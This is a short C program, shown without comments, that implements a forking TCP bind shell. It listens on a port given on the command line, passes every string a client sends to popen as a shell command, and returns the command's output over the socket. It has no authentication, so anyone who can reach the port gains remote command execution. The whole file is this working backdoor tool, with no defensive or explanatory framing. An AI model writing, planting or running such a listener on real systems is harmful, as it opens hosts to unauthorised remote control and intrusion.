#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
int main(int argc, char **argv)
{
    int sock, listener;
    struct sockaddr_in addr;
    char buf[2048];
    int bytes_read; 
    int portno; 
    FILE *command_file; 
    int nread = 0;
    
    if (argc < 2) {
         fprintf(stderr,"ERROR, no port provided\n");
         exit(1);
     }
 
    listener = socket(AF_INET, SOCK_STREAM, 0);
    if(listener < 0) {
        perror("socket");
        exit(1);
    }
    portno = atoi(argv[1]);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(portno);
    if(bind(listener, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind");
        exit(2);
    }
 
    listen(listener, 5);
    
    while(1) {
	    sock = accept(listener, NULL, NULL);
	    if(sock < 0) {
	        perror("ERROR accepting socket conn");
	        exit(3);
	    }
 
	    switch(fork()) {

	    case -1:
	        perror("fork");
	        break;

	    case 0:
	        close(listener);
	        while(1) {
	            bzero(buf, sizeof(buf));
	            nread = 0;
	            bytes_read = recv(sock, buf, sizeof(buf), 0);
	            if(bytes_read <= 0)
	                break;
	            command_file = popen(buf, "r");
	            
	            while((nread = fread(buf, 1, sizeof(buf), command_file)) > 0) {
	                fwrite(buf, sizeof(char), nread, stdout);
	                send(sock, buf, nread, 0);
	            }
	            bzero(buf, sizeof(buf));
	            send(sock, buf, sizeof(buf), 0);
	            pclose(command_file);
	        }
	        
	        close(sock);
	        exit(0);

	    default:
	        close(sock);
		}
	}

	return 0;
}